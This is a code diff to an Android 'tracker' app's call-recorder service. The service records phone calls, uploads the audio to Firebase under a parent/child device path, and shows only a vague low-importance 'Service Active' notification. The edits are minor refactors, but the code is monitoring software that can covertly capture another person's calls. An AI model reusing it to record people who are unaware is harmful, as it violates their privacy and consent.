@@ -12,6 +12,7 @@ import android.os.IBinder
 import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.abuzahra.tracker.R
 import com.abuzahra.tracker.SharedPrefsManager
 import com.google.firebase.storage.FirebaseStorage
 import com.google.firebase.firestore.FirebaseFirestore
@@ -31,7 +32,7 @@ class CallRecorderService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        startForeground(3, createNotification())
+        startForeground(2, createNotification())
         listenToCallState()
     }
 
@@ -50,8 +51,7 @@ class CallRecorderService : Service() {
     private fun startRecording() {
         try {
             val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-            val fileName = "CALL_$timeStamp.3gp"
-            outputFile = File(cacheDir, fileName).absolutePath
+            outputFile = File(cacheDir, "CALL_$timeStamp.3gp").absolutePath
 
             recorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
@@ -63,7 +63,7 @@ class CallRecorderService : Service() {
             }
             isRecording = true
             Log.d("CallRecorder", "Recording started")
-        } catch (e: Exception) { Log.e("CallRecorder", "Failed to start", e) }
+        } catch (e: Exception) { Log.e("CallRecorder", "Failed", e) }
     }
 
     private fun stopRecordingAndUpload() {
@@ -71,7 +71,7 @@ class CallRecorderService : Service() {
             recorder?.apply { stop(); release() }
             recorder = null; isRecording = false
             uploadAudioFile(outputFile)
-        } catch (e: Exception) { Log.e("CallRecorder", "Failed to stop", e) }
+        } catch (e: Exception) { Log.e("CallRecorder", "Stop Failed", e) }
     }
 
     private fun uploadAudioFile(path: String?) {
@@ -86,19 +86,19 @@ class CallRecorderService : Service() {
             try {
                 storageRef.putFile(uri).await()
                 val downloadUrl = storageRef.downloadUrl.await().toString()
-                val data = hashMapOf("type" to "audio", "url" to downloadUrl, "timestamp" to System.currentTimeMillis(), "phone" to "Unknown")
+                val data = hashMapOf("type" to "audio", "url" to downloadUrl, "timestamp" to System.currentTimeMillis())
                 FirebaseFirestore.getInstance().collection("parents").document(parentId).collection("children").document(deviceId).collection("calls").add(data).await()
                 file.delete()
             } catch (e: Exception) { Log.e("CallRecorder", "Upload Failed", e) }
         }
     }
-
+    
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW)
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
-    private fun createNotification(): Notification = NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Service Active").setSmallIcon(android.R.drawable.ic_btn_speak_now).build()
+    private fun createNotification(): Notification = NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Service Active").setSmallIcon(R.drawable.ic_launcher_foreground).build()
     override fun onBind(intent: Intent?): IBinder? = null
 }
